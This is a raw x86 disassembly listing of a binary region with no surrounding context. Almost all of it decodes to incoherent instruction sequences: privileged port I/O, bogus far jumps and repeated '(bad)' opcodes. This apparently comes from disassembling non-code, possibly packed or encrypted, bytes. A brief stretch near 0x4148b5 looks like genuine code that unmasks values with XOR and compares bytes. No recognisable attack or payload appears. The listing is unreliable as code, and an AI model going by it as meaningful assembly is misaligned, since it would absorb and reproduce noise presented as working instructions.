  414549:	xchg   edi,eax
  41454a:	ins    DWORD PTR es:[edi],dx
  41454b:	cwde   
  41454c:	dec    eax
  41454d:	inc    esi
  41454e:	sahf   
  41454f:	pop    es
  414550:	sbb    BYTE PTR [edi-0x46],cl
  414553:	ret    
  414554:	mov    ds:0xc38d691e,al
  414559:	jbe    0x414507
  41455b:	lock mov WORD PTR [ecx],fs
  41455e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41455f:	adc    BYTE PTR [eax+0x741d5b61],0x3b
  414566:	mov    DWORD PTR [ebx],edi
  414568:	add    edi,DWORD PTR ds:0xe04e4a69
  41456e:	lea    ebx,[edx+0x7b98ce14]
  414574:	loopne 0x4145b8
  414576:	not    BYTE PTR [ebp+esi*1+0x14]
  41457a:	mov    edx,0xf1796340
  41457f:	daa    
  414580:	outs   dx,DWORD PTR ds:[esi]
  414581:	add    eax,0xe92cbd66
  414586:	adc    al,0xc7
  414588:	mov    gs:0x27188610,al
  41458e:	inc    esp
  41458f:	std    
  414590:	and    eax,0x3ad3d1c3
  414595:	pop    edi
  414596:	daa    
  414597:	mov    gs,WORD PTR [eax-0x2b6c99e0]
  41459d:	cwde   
  41459e:	mov    DWORD PTR [edi-0x7a],eax
  4145a1:	sbb    eax,0xfd1b3555
  4145a6:	mov    ah,0xa0
  4145a8:	mov    bh,0x81
  4145aa:	aaa    
  4145ab:	ficom  DWORD PTR [edx+0x4b87c8ed]
  4145b1:	add    ebp,DWORD PTR [ebx+0x6b3e2b77]
  4145b7:	mov    ebp,0x5043fab6
  4145bc:	mov    ds:0xa2c47b9e,al
  4145c1:	out    0xc0,eax
  4145c3:	iret   
  4145c4:	pop    esi
  4145c5:	inc    ebx
  4145c6:	es push ds
  4145c8:	add    ecx,DWORD PTR [edx+0x7e94f1f8]
  4145ce:	rcl    DWORD PTR [ebx-0x5f041e44],1
  4145d4:	pop    es
  4145d5:	xor    ecx,DWORD PTR [edx-0x63]
  4145d8:	push   es
  4145d9:	imul   DWORD PTR [ecx+0x5c]
  4145dc:	dec    ecx
  4145dd:	dec    eax
  4145de:	(bad)  
  4145df:	sar    ebx,cl
  4145e1:	int3   
  4145e2:	cld    
  4145e3:	repnz dec ecx
  4145e5:	loopne 0x414664
  4145e7:	iret   
  4145e8:	jnp    0x414573
  4145ea:	push   ss
  4145eb:	aaa    
  4145ec:	int3   
  4145ed:	mov    cl,0x29
  4145ef:	rol    BYTE PTR [eax+0x315e4a18],cl
  4145f5:	out    dx,eax
  4145f6:	je     0x414626
  4145f8:	jmp    0xa243cb16
  4145fd:	jnp    0x41460a
  4145ff:	lea    ecx,[esi+0x1]
  414602:	or     al,0xeb
  414604:	ds and ecx,edi
  414607:	dec    ebp
  414608:	loope  0x414617
  41460a:	pop    esi
  41460b:	(bad)  
  41460d:	mov    ch,0xe5
  41460f:	sub    esp,DWORD PTR ds:0xfef7f758
  414615:	adc    ah,BYTE PTR [eax]
  414617:	jg     0x414695
  414619:	test   BYTE PTR [edi+0x712dc10b],bh
  41461f:	imul   ebx,DWORD PTR [esi-0x10],0x21f7418d
  414626:	xor    bh,bl
  414628:	gs mov ch,0x83
  41462b:	jecxz  0x4145d8
  41462d:	dec    eax
  41462e:	fcomp  DWORD PTR [ecx+0x15]
  414631:	sbb    esp,esp
  414633:	jmp    0x4145e7
  414635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414636:	push   ebx
  414637:	jp     0x41466b
  414639:	sbb    dh,BYTE PTR [ebx-0x3c]
  41463c:	pop    ecx
  41463d:	cmp    DWORD PTR [bp+si],ecx
  414640:	cli    
  414641:	repz mov ecx,DWORD PTR cs:[ecx+0xf270705]
  414649:	iret   
  41464a:	xchg   esi,eax
  41464b:	cwde   
  41464c:	hlt    
  41464d:	scas   eax,DWORD PTR es:[edi]
  41464e:	inc    esi
  41464f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414650:	mov    ecx,0x2aeedc24
  414655:	fcom   DWORD PTR [ebp-0x6d]
  414658:	ret    
  414659:	mov    ebx,0x972d2260
  41465e:	cmp    eax,0x8c3132a
  414663:	fild   QWORD PTR [ebx]
  414665:	xchg   esi,eax
  414666:	sub    ebx,DWORD PTR [ebp+ebp*4+0xc771f1e]
  41466d:	bound  eax,QWORD PTR [ecx]
  41466f:	ds retf 0xa2c0
  414673:	mov    gs,ecx
  414675:	loope  0x4146e5
  414677:	inc    esp
  414678:	ret    0x864
  41467b:	xchg   esp,eax
  41467c:	jmp    0x41461f
  41467e:	xor    DWORD PTR [edx+0x19adaf6f],0x54e460e3
  414688:	lds    ebp,FWORD PTR [ebx-0x4901f18d]
  41468e:	ss push esp
  414690:	(bad)  
  414691:	dec    ebp
  414692:	pop    ecx
  414693:	loopne 0x41462f
  414695:	mov    al,0xc7
  414697:	push   ebp
  414698:	test   eax,0x9fe8b6ee
  41469d:	or     ebx,DWORD PTR ds:0x5fc74175
  4146a3:	out    dx,al
  4146a4:	mov    al,0xf0
  4146a6:	inc    ebp
  4146a7:	mov    ebx,0x7d8ce74f
  4146ac:	mov    ch,bl
  4146ae:	jg     0x414639
  4146b0:	test   BYTE PTR [edx-0x1f3be882],0x58
  4146b7:	(bad)
  4146ba:	out    dx,al
  4146bb:	fwait
  4146bc:	cmp    esp,DWORD PTR [eax+eiz*1+0x2d]
  4146c0:	dec    esp
  4146c1:	enter  0xa747,0xa3
  4146c5:	iret   
  4146c6:	jne    0x414701
  4146c8:	in     eax,dx
  4146c9:	dec    eax
  4146ca:	mov    cl,BYTE PTR [edx+0x31c3058]
  4146d0:	mov    esp,0xf8c412d9
  4146d5:	mov    edi,0xb2e973ee
  4146da:	add    eax,0x17806ea3
  4146df:	xlat   BYTE PTR ds:[ebx]
  4146e0:	pop    ss
  4146e1:	loopne 0x414675
  4146e3:	mov    al,0x84
  4146e5:	add    BYTE PTR [edi],0xae
  4146e8:	pop    es
  4146e9:	sub    edi,esi
  4146eb:	xor    DWORD PTR [edi],esp
  4146ed:	out    dx,eax
  4146ee:	nop
  4146ef:	pop    ebx
  4146f0:	sbb    al,BYTE PTR [ebp-0x3b]
  4146f3:	jg     0x414697
  4146f5:	xchg   BYTE PTR [ebp+0x64116c27],ah
  4146fb:	int    0xb3
  4146fd:	mov    eax,0xdb9be1e6
  414702:	repnz out dx,al
  414704:	mov    ebx,0x45a61dca
  414709:	push   ss
  41470a:	sub    eax,0x50b5fcf2
  41470f:	lock sub al,0x92
  414712:	out    0xec,al
  414714:	iret   
  414715:	sub    ch,cl
  414717:	push   es
  414718:	imul   ecx,DWORD PTR [edx+esi*1-0x1cfac539],0x35
  414720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414721:	lods   eax,DWORD PTR ds:[esi]
  414722:	vpsrlq xmm0,xmm5,xmm1
  414727:	dec    esi
  414728:	sbb    al,0x7
  41472a:	dec    eax
  41472b:	inc    ecx
  41472c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41472d:	mov    ds:0xb3078ea2,al
  414732:	ror    BYTE PTR [ecx+0x45904542],1
  414738:	inc    ebx
  414739:	sbb    BYTE PTR [edx-0x3de243e4],bl
  41473f:	mov    ch,0xfc
  414741:	cmp    BYTE PTR [eax-0x1e4b157e],bh
  414747:	mov    gs,WORD PTR [ebp-0x1d6b97f5]
  41474d:	dec    esp
  41474e:	leave  
  41474f:	lods   eax,DWORD PTR ds:[esi]
  414750:	jae    0x4147b3
  414752:	push   esp
  414753:	sbb    DWORD PTR [edi-0x43a9ec7f],ecx
  414759:	into   
  41475a:	or     ebp,0xffffff9e
  41475d:	out    dx,eax
  41475e:	pop    ecx
  41475f:	push   ss
  414760:	outs   dx,BYTE PTR ds:[esi]
  414761:	fnstsw WORD PTR [ecx-0x79]
  414764:	or     edi,DWORD PTR [edi]
  414766:	or     dh,BYTE PTR [ebp+0x42c170b]
  41476c:	mov    ebx,cs
  41476e:	dec    DWORD PTR [edi+esi*4]
  414771:	scas   eax,DWORD PTR es:[edi]
  414772:	cmp    al,0x52
  414774:	ret    0x680f
  414777:	or     BYTE PTR [esi-0x69],dh
  41477a:	jnp    0x41476c
  41477c:	jmp    0x41478b
  41477e:	cmp    al,0xb5
  414780:	or     eax,0x9e9dd1c8
  414785:	inc    esi
  414786:	nop
  414787:	sub    ebx,DWORD PTR [esi+0x31]
  41478a:	lods   al,BYTE PTR ds:[esi]
  41478b:	(bad)  
  41478c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41478d:	imul   BYTE PTR [eax+0x7024a4f4]
  414793:	pop    ecx
  414794:	js     0x4147bd
  414796:	cmp    eax,0x844348dc
  41479b:	pop    ecx
  41479c:	push   0xe6bc0510
  4147a1:	sti    
  4147a2:	in     eax,dx
  4147a3:	imul   ebx,DWORD PTR [eax+0x657049d2],0xffffffc7
  4147aa:	jno    0x414818
  4147ac:	or     al,0xc3
  4147ae:	out    0x8,eax
  4147b0:	rcl    DWORD PTR [esi],cl
  4147b2:	int    0xc4
  4147b4:	nop
  4147b5:	sti    
  4147b6:	jecxz  0x4147ad
  4147b8:	stos   BYTE PTR es:[edi],al
  4147b9:	ret    
  4147ba:	mov    dh,0xc3
  4147bc:	les    esi,FWORD PTR [esi+0x14]
  4147bf:	push   esp
  4147c0:	fxrstor [ecx]
  4147c3:	call   0x74f0:0xe90354d3
  4147ca:	ja     0x41483b
  4147cc:	stos   BYTE PTR es:[edi],al
  4147cd:	jmp    0xf816c324
  4147d2:	popf   
  4147d3:	js     0x414789
  4147d5:	ret    
  4147d6:	test   DWORD PTR [esi],eax
  4147d8:	xchg   esp,eax
  4147d9:	shl    DWORD PTR [edx+eax*2],0xf
  4147dd:	mov    dl,BYTE PTR [ebx-0x75d94fbd]
  4147e3:	rcl    DWORD PTR ds:0xb94b8752,cl
  4147e9:	cmp    ecx,DWORD PTR [ecx]
  4147eb:	clc    
  4147ec:	mov    bl,BYTE PTR [eax+0x72d10ead]
  4147f2:	rcl    BYTE PTR [esp+ebp*4],cl
  4147f5:	mov    dl,0xbb
  4147f7:	cmp    DWORD PTR [ecx-0x43],eax
  4147fa:	stos   BYTE PTR es:[edi],al
  4147fb:	bound  ebp,QWORD PTR [esi+0x11]
  4147fe:	inc    eax
  4147ff:	inc    ebx
  414800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414801:	push   edi
  414802:	ds sbb eax,0x8d98d02c
  414808:	ds xchg esp,eax
  41480a:	ins    DWORD PTR es:[edi],dx
  41480b:	data16 (bad) 
  41480d:	rcr    BYTE PTR [ebx+0x72],0xb8
  414811:	xchg   ecx,eax
  414812:	fcmovu st,st(2)
  414814:	pop    esi
  414815:	cld    
  414816:	xchg   BYTE PTR [ebx-0x30],dl
  414819:	rcl    BYTE PTR ds:0x660557e0,cl
  41481f:	push   edx
  414820:	scas   eax,DWORD PTR es:[edi]
  414821:	not    DWORD PTR [edi+edx*8]
  414824:	sbb    esp,DWORD PTR [edx]
  414826:	int3   
  414827:	lds    ebx,FWORD PTR [esi-0x4ec24b9a]
  41482d:	retf   0x5fdf
  414830:	adc    ecx,edi
  414832:	std    
  414833:	add    dl,ah
  414835:	test   eax,0x18cb4866
  41483a:	mov    esi,0xd5ccbec9
  41483f:	push   eax
  414840:	out    0x1b,al
  414842:	repnz iret 
  414844:	in     al,0x11
  414846:	imul   ah
  414848:	mov    ah,0x1a
  41484a:	pop    ds
  41484b:	cmp    eax,0xca1fff58
  414850:	push   edx
  414851:	ret    0x2cda
  414854:	push   es
  414855:	xchg   ecx,eax
  414856:	adc    edx,DWORD PTR [ebx-0x6e94c95f]
  41485c:	stc    
  41485d:	(bad)  
  41485e:	or     eax,0xf3962496
  414863:	je     0x4148ad
  414865:	imul   BYTE PTR es:[edi+0x441b5b01]
  41486c:	xor    edi,esp
  41486e:	test   al,cl
  414870:	popf   
  414871:	cwde   
  414872:	xchg   BYTE PTR [eax],bl
  414874:	push   esi
  414875:	in     eax,0xe6
  414877:	pop    ecx
  414878:	test   dl,dl
  41487a:	int    0x55
  41487c:	cdq    
  41487d:	and    al,0x1
  41487f:	xchg   ebp,eax
  414880:	adc    ah,BYTE PTR [ebx+0x3]
  414883:	push   esp
  414884:	pop    ebx
  414885:	jbe    0x4148b8
  414887:	mov    BYTE PTR [edi+0x66899fbc],al
  41488d:	jae    0x4148e0
  41488f:	cmc    
  414890:	test   eax,0x5b219692
  414895:	pop    edi
  414896:	leave  
  414897:	xchg   esi,eax
  414898:	fnstenv [edi-0x1f6f1acc]
  41489e:	jb     0x414870
  4148a0:	cdq    
  4148a1:	xor    al,0xa1
  4148a3:	int    0xd7
  4148a5:	test   al,0xd0
  4148a7:	ins    DWORD PTR es:[edi],dx
  4148a8:	xor    edi,edx
  4148aa:	(bad)
  4148ad:	pushf  
  4148ae:	jle    0x4148b2
  4148b0:	mov    bh,0x32
  4148b2:	ret    0x9853
  4148b5:	mov    edx,DWORD PTR [ebp+0x8]
  4148b8:	xor    edx,eax
  4148ba:	add    edx,esi
  4148bc:	jne    0x4124e5
  4148c2:	mov    edx,DWORD PTR [ebp-0xc]
  4148c5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148cc:	mov    bl,BYTE PTR [ebp-0x1]
  4148cf:	cmp    dl,bl
  4148d1:	je     0x416d0f
  4148d7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148da:	mov    edx,DWORD PTR [ebp-0xc]
  4148dd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148e4:	mov    ebx,DWORD PTR [ebp+0xc]
  4148e7:	xor    ecx,eax
  4148e9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f5]
  4148f0:	jne    0x4191a3
  4148f6:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148f9:	mov    edx,DWORD PTR [ebp+0xc]
  4148fc:	xor    ecx,eax
  4148fe:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f5]
  414906:	mov    edx,DWORD PTR [ebp-0x18]
  414909:	xor    edx,eax
  41490b:	add    edx,esi
  41490d:	cmp    ecx,edx
  41490f:	mov    ecx,DWORD PTR [ebp-0x14]
  414912:	mov    DWORD PTR [ebp+0x8],ecx
  414915:	mov    ecx,DWORD PTR [ebp+0x8]
  414918:	je     0x41b60b
  41491e:	xor    ecx,eax
  414920:	add    ecx,esi
  414922:	mov    ecx,0x242ebf1
  414927:	je     0x416d97
  41492d:	mov    edx,DWORD PTR [ebp+0x8]
  414930:	jmp    0x416c90
  414935:	jo     0x414954
  414937:	cmc    
  414938:	dec    eax
  414939:	or     BYTE PTR [eax-0x4213ea36],0xb0
  414940:	sub    eax,0x247c04bd
  414945:	mov    ecx,0x3e838069
  41494a:	pop    esi
  41494b:	add    DWORD PTR [ebx-0x8d54bdb],0x18
  414952:	pop    edx
  414953:	add    al,0x16
  414955:	movnti DWORD PTR [edi],ebx
  414958:	sbb    DWORD PTR [edx+0x7d],ebx
  41495b:	jno    0x414976
  41495d:	dec    ebx
  41495e:	stos   DWORD PTR es:[edi],eax
  41495f:	or     al,0xd3
  414961:	popa   
  414962:	mov    esp,0x7af7f6ce
  414967:	(bad)  
  414968:	test   al,0x61
  41496a:	bound  eax,QWORD PTR [ebx+edi*1+0x10]
  41496e:	cdq    
  41496f:	mov    eax,0xdcffe992
  414974:	out    dx,eax
  414975:	pop    esp
  414976:	push   0xffffff85
  414978:	nop
  414979:	ror    BYTE PTR [ebx],0xe8
  41497c:	fiadd  DWORD PTR [ebx+0x20]
  41497f:	neg    ah
  414981:	dec    ebx
  414982:	jbe    0x414955
  414984:	ret    0xa19c
  414987:	or     DWORD PTR [eax],edx
  414989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41498a:	sbb    BYTE PTR [edi+0x2f],ah
  41498d:	outs   dx,BYTE PTR ds:[esi]
  41498e:	cli    
  41498f:	imul   eax,DWORD PTR [eax],0xffffffb7
  414992:	push   ds
  414993:	mov    bl,0x29
  414995:	or     al,0xeb
  414997:	sub    eax,0x2b0fb7c8
  41499c:	xor    BYTE PTR [ecx],dl
  41499e:	xabort 0x89
  4149a1:	retf   
  4149a2:	lock (bad) 
  4149a4:	cmc    
  4149a5:	sbb    dh,0x49
  4149a8:	les    eax,FWORD PTR [esp+ecx*2-0x2e]
  4149ac:	push   edi
  4149ad:	sub    al,0x14
  4149af:	in     al,0xc3
  4149b1:	mov    al,0x69
  4149b3:	xchg   esi,eax
  4149b4:	jl     0x4149e1
  4149b6:	js     0x4149af
  4149b8:	mov    bh,0x31
  4149ba:	fcomp  DWORD PTR [ecx+0x74653a99]
  4149c0:	fidiv  DWORD PTR [edi+eax*4+0x3c]
  4149c4:	bound  edx,QWORD PTR [eax-0x498c2ebf]
  4149ca:	sar    BYTE PTR [ebx],0x99
  4149cd:	lahf   
  4149ce:	and    ebx,DWORD PTR [ebx]
  4149d0:	push   ecx
  4149d1:	mov    ebp,0x7d8251c
  4149d6:	mov    dh,0x66
  4149d8:	ja     0x4149c2
  4149da:	jecxz  0x4149df
  4149dc:	jmp    0xff2b:0x237e9faf
  4149e3:	arpl   sp,ax
  4149e5:	lods   eax,DWORD PTR ds:[esi]
  4149e6:	bound  esp,QWORD PTR [ecx]
  4149e8:	(bad)
  4149ed:	dec    esp
  4149ee:	jo     0x4149be
  4149f0:	adc    esp,ebp
  4149f2:	push   edi
  4149f3:	mov    al,0xbc
  4149f5:	ss jg  0x4149b1
  4149f8:	das    
  4149f9:	push   edx
  4149fa:	cmp    eax,0xf9cfedf2
  4149ff:	add    BYTE PTR [ebx-0x63],0x7f
  414a03:	sahf   
  414a04:	shl    BYTE PTR gs:[ebx-0x11],0x4a
  414a09:	mov    edx,0xd499b42a
  414a0e:	mov    esi,DWORD PTR [esi+edi*4]
  414a11:	in     al,0xb1
  414a13:	push   eax
  414a14:	xchg   al,ch
  414a16:	popa   
  414a17:	xchg   ebp,eax
  414a18:	lods   eax,DWORD PTR ds:[esi]
  414a19:	enter  0x202c,0x1
  414a1d:	clc    
  414a1e:	jmp    0x4149ff
  414a20:	mov    eax,ds:0xd8ec56c5
  414a25:	mov    esp,0xdaac5932
  414a2a:	xor    ebp,DWORD PTR [eax-0x69]
  414a2d:	or     bh,BYTE PTR [eax+0x779e0edf]
  414a33:	pop    edi
  414a34:	dec    edx
  414a35:	cpuid  
  414a37:	fdiv   DWORD PTR [edx]
  414a39:	scas   eax,DWORD PTR es:[edi]
  414a3a:	leave  
  414a3b:	or     al,0x23
  414a3d:	(bad)  
  414a3e:	sahf   
  414a3f:	dec    edx
  414a40:	(bad)  
  414a41:	in     al,dx
  414a42:	inc    edi
  414a43:	mov    bl,bl
  414a45:	push   cs
  414a46:	add    BYTE PTR [ebx+0x61c794d9],0xee
  414a4d:	iret   
  414a4e:	addr16 push es
  414a50:	xor    cl,dh
  414a52:	mov    ebp,0x60b0cc62
  414a57:	pop    eax
  414a58:	loop   0x4149ef
  414a5a:	inc    esi
  414a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a5c:	lock (bad) 
  414a5e:	clc    
  414a5f:	aaa    
  414a60:	mov    fs,WORD PTR [esi-0x7fe6153b]
  414a66:	dec    ecx
  414a67:	call   0x7490:0x840da010
  414a6e:	push   ebx
  414a6f:	inc    ecx
  414a70:	mov    esi,0xec71dba4
  414a75:	sbb    dl,BYTE PTR [ebp-0x3d]
  414a78:	cwde   
  414a79:	or     bl,BYTE PTR [eax-0x40]
  414a7c:	dec    ebp
  414a7d:	(bad)  
  414a7f:	sub    eax,0xcca423a8
  414a84:	cmp    esi,0xffffff86
  414a87:	dec    BYTE PTR [edx+0x6f]
  414a8a:	lock loope 0x414b06
  414a8d:	cmc    
  414a8e:	jge    0x414a89
  414a90:	push   esp
  414a91:	mov    esi,0x619428fc
  414a96:	dec    ebp
  414a97:	icebp  
  414a98:	mov    ebx,cs
  414a9a:	dec    esi
  414a9b:	push   es
  414a9c:	(bad)  
  414a9d:	mov    ebx,0x524938ca
  414aa2:	pop    edx
  414aa3:	and    ebx,DWORD PTR [esp+esi*1]
  414aa6:	mov    ds:0x4b368f3c,al
  414aab:	fmul   st,st(7)
  414aad:	inc    edi
  414aae:	pop    ebp
  414aaf:	rol    DWORD PTR [ebp-0x39],0x50
  414ab3:	cs jno 0x414b31
  414ab6:	push   esi
  414ab7:	fdivr  DWORD PTR [ecx+edi*1-0x53]
  414abb:	pop    esi
  414abc:	outs   dx,BYTE PTR ds:[si]
  414abe:	xchg   ecx,eax
  414abf:	enter  0x26c,0x12
  414ac3:	sub    al,al
  414ac5:	retf   0x9277
  414ac8:	push   0x3ea306f1
  414acd:	adc    DWORD PTR [ebx+0x4822e427],0x3edee447
  414ad7:	mov    esp,0x6a7427e3
  414adc:	jb     0x414a89
  414ade:	stos   DWORD PTR es:[edi],eax
  414adf:	mov    dl,0xc
  414ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae2:	mov    cl,0xa2
  414ae4:	adc    BYTE PTR [ecx+0x5c],dh
  414ae7:	vpshld xmm15,xmm0,xmm5
  414aec:	icebp  
  414aed:	sbb    BYTE PTR [ecx+0x56],0x15
  414af1:	xchg   ebx,eax
  414af2:	pushf  
  414af3:	js     0x414a8a
  414af5:	(bad)  
  414af6:	std    
  414af7:	dec    ebx
  414af8:	xor    edi,DWORD PTR [eax-0x41]
  414afb:	cli    
  414afc:	clc    
  414afd:	sub    DWORD PTR [eax-0x18],eax
  414b00:	and    al,cl
  414b02:	push   ebx
  414b03:	dec    esp
  414b04:	int3   
  414b05:	in     al,dx
  414b06:	mov    esp,0x6d428f93
  414b0b:	call   0xca3a:0x1a6f2250
  414b12:	idiv   DWORD PTR [esp+eiz*2-0x7]
  414b16:	pop    eax
  414b17:	gs cmc 
  414b19:	sbb    BYTE PTR [eax+ebp*4+0x6a],ch
  414b1d:	mov    es,WORD PTR [ebx+0x869a1c4]
  414b23:	fst    QWORD PTR [ebp-0x4fb37a5e]
  414b29:	int3   
  414b2a:	jl     0x414ab4
  414b2c:	(bad)  
  414b2d:	imul   ebx,DWORD PTR [edi-0x680858ff],0x59326eb8
  414b37:	xor    esp,DWORD PTR [esi+eax*8-0x19]
  414b3b:	pop    ds
  414b3c:	cmp    bh,BYTE PTR [edx+0x76]
  414b3f:	hlt    
  414b40:	xor    al,0xbb
  414b42:	xchg   DWORD PTR [esi+0x4d013568],edi
  414b48:	sub    eax,0x12bbf27b
  414b4d:	pop    es
  414b4e:	pop    eax
  414b4f:	sub    bh,ah
  414b51:	stos   BYTE PTR es:[edi],al
  414b52:	ja     0x414b87
  414b54:	leave  
  414b55:	repnz mov bl,0x1b
  414b58:	inc    edx
  414b59:	test   al,0x5a
  414b5b:	popf   
  414b5c:	jmp    0xd11e:0x8ccab77
  414b63:	mov    dh,0xdd
  414b65:	loop   0x414b11
  414b67:	in     eax,0x47
  414b69:	add    BYTE PTR [edi+0x1b3273dd],0xe5
  414b70:	in     eax,0x6d
  414b72:	jb     0x414b3f
  414b74:	sub    DWORD PTR [ebx],edi
  414b76:	pop    ss
  414b77:	mov    dl,0x83
  414b79:	dec    ebx
  414b7a:	inc    esp
  414b7b:	and    DWORD PTR [edx+edi*8-0x5bf5ab68],ebx
  414b82:	clc    
  414b83:	xchg   ebx,eax
  414b84:	lahf   
  414b85:	push   es
  414b86:	mov    esp,ds
  414b88:	jge    0x414b9c
  414b8a:	gs cli 
  414b8c:	icebp  
  414b8d:	jbe    0x414be4
  414b8f:	ja     0x414ba4
  414b91:	jmp    0x414bec
  414b93:	into   
  414b94:	xchg   edi,eax
  414b95:	inc    ebx
  414b96:	xchg   ebx,eax
  414b97:	mov    bl,0xda
  414b99:	xchg   DWORD PTR [ecx+ebp*4],ebx
  414b9c:	fisttp DWORD PTR [edi]
  414b9e:	loope  0x414b27
  414ba0:	jecxz  0x414bb8
  414ba2:	call   0xdb077199
  414ba7:	or     DWORD PTR [edx],ecx
  414ba9:	test   DWORD PTR [ebx+0x67a70690],ebx
  414baf:	or     al,0x39
  414bb1:	(bad)  [eax-0x17de4e2d]
  414bb7:	push   es
  414bb8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  414bba:	inc    edx
  414bbb:	stos   BYTE PTR es:[edi],al
  414bbc:	xchg   BYTE PTR [eax],dh
  414bbe:	and    BYTE PTR [ebp+0x7e46e95d],ah
  414bc4:	dec    ebx
  414bc5:	mov    al,ds:0x76fb0063
  414bca:	xor    BYTE PTR [ebp-0x1d],0x94
  414bce:	int3   
  414bcf:	jg     0x414b75
  414bd1:	jmp    0x920dd6a2
  414bd6:	or     ebx,DWORD PTR ds:0xb4f188a3
  414bdc:	lahf   
  414bdd:	dec    esp
  414bde:	mov    WORD PTR [edx+0x70],cs
  414be1:	xor    dh,BYTE PTR [ecx]
  414be3:	xor    DWORD PTR [edi+0x4b],edx
  414be6:	ins    DWORD PTR es:[edi],dx
  414be7:	sbb    cl,BYTE PTR ds:0x166c7e25
  414bed:	sbb    al,0xcf
  414bef:	mov    edi,0xe95b964f
  414bf4:	cwde   
  414bf5:	lahf   
  414bf6:	add    BYTE PTR [edi-0x3387816d],0xac
  414bfd:	xor    esp,edi
  414bff:	mov    DWORD PTR [edi+0x77a2217a],eax
  414c05:	mov    DWORD PTR ss:[edi-0x50],edi
  414c09:	jmp    0x414bb8
  414c0b:	and    edx,DWORD PTR [edi]
  414c0d:	ins    BYTE PTR es:[edi],dx
  414c0e:	loopne 0x414c2d
  414c10:	sahf   
  414c11:	xchg   esp,eax
  414c12:	mov    ebx,0x3442d4bb
  414c17:	aam    0x73
  414c19:	inc    esi
  414c1a:	sub    eax,0xf82e617a
  414c1f:	add    al,0x7a
  414c21:	inc    ecx
  414c22:	enter  0xb9cc,0x17
  414c26:	iret   
  414c27:	or     ecx,edx
  414c29:	sub    eax,0x5691d0db
  414c2e:	mov    bl,0x88
  414c30:	sub    eax,0x767eca01
  414c35:	mov    edx,DWORD PTR [edi+edx*8]
  414c38:	add    al,0x8b
  414c3a:	or     BYTE PTR [edi],0x7b
  414c3d:	fisub  WORD PTR [edi+ecx*8+0x37bc1a24]
  414c44:	xchg   ebp,ebx
  414c46:	jmp    0x1dd4:0x81249ff6
  414c4d:	into   
  414c4e:	jl     0x414c8d
  414c50:	mov    cl,0xe2
  414c52:	dec    eax
  414c53:	pop    esi
  414c54:	or     BYTE PTR [esi],al
  414c56:	ins    BYTE PTR es:[edi],dx
  414c57:	mov    al,0xb
  414c59:	add    edx,esi
  414c5b:	or     esi,esi
  414c5d:	pop    ebx
  414c5e:	stos   DWORD PTR es:[edi],eax
  414c5f:	sbb    ah,BYTE PTR [ecx]
  414c61:	shl    DWORD PTR [ebx],0xf6
  414c64:	inc    ebp
  414c65:	sbb    eax,0x2bbf2090
  414c6a:	test   al,0x5a
  414c6c:	pop    eax
  414c6d:	jo     0x414cb5
  414c6f:	nop
  414c70:	cmp    al,0x15
  414c72:	lahf   
  414c73:	(bad)  [ebx-0x400600b7]
  414c79:	ins    DWORD PTR es:[di],dx
  414c7b:	lds    ebx,FWORD PTR [ebx]
  414c7d:	pop    ebp
  414c7e:	out    dx,eax
  414c7f:	test   BYTE PTR [eax],ah
  414c81:	ja     0x414cf7
  414c83:	dec    esp
  414c84:	mov    bh,0x1
  414c86:	sbb    eax,0xfb9baa0d
  414c8b:	mov    dh,0x98
  414c8d:	jge    0x414c80
  414c8f:	add    eax,0xddb85507
  414c94:	dec    eax
  414c95:	retf   
  414c96:	outs   dx,DWORD PTR ds:[esi]
  414c97:	je     0x414c67
  414c99:	scas   al,BYTE PTR es:[edi]
  414c9a:	test   ch,al
  414c9c:	mov    edx,0x16ea2e36
  414ca1:	push   eax
  414ca2:	ror    bh,cl
  414ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca5:	or     DWORD PTR [ebp+0x26a848f4],eax
  414cab:	ss sti 
  414cad:	and    DWORD PTR [esi-0x27],ebx
  414cb0:	fcmovb st,st(5)
  414cb2:	sbb    dl,BYTE PTR [esi-0x4d7e72bf]
  414cb8:	daa    
  414cb9:	push   ecx
  414cba:	jp     0x414ccd
  414cbc:	jne    0x414d1b
  414cbe:	jmp    0xb9e:0xa9abfa3a
  414cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc6:	rcl    DWORD PTR [edx+0xf],0x71
  414cca:	push   ds
  414ccb:	adc    edx,DWORD PTR [edi+0x5d387df9]
  414cd1:	les    ebx,FWORD PTR [esi]
  414cd3:	xchg   edi,eax
  414cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd5:	sub    al,bh
  414cd7:	xchg   ebp,eax
  414cd8:	add    eax,0x8d316910
  414cdd:	xchg   ebx,eax
  414cdf:	lea    edx,[edi-0x1eb04872]
  414ce5:	ret    0x835d
  414ce8:	or     BYTE PTR [edx],0xfd
  414ceb:	jne    0x414cd5
  414ced:	pop    edx
  414cee:	cmp    al,0xdc
  414cf0:	mov    ch,0x77
  414cf2:	call   0xbf87edcd
  414cf7:	mov    ch,0x47
  414cf9:	ins    DWORD PTR es:[edi],dx
  414cfa:	ss push ds
  414cfc:	or     esi,edx
  414cfe:	lods   al,BYTE PTR ds:[esi]
  414cff:	loope  0x414d40
  414d01:	add    DWORD PTR [edx+0x14],esi
  414d04:	in     eax,0xa3
  414d06:	aas    
  414d07:	lods   eax,DWORD PTR ds:[esi]
  414d08:	es push edx
  414d0a:	cmc    
  414d0b:	popf   
  414d0c:	pop    ecx
  414d0d:	pop    ss
  414d0e:	(bad)  
  414d0f:	sar    DWORD PTR [edx-0x4b],1
  414d12:	loope  0x414d4d
  414d14:	dec    eax
  414d15:	out    dx,eax
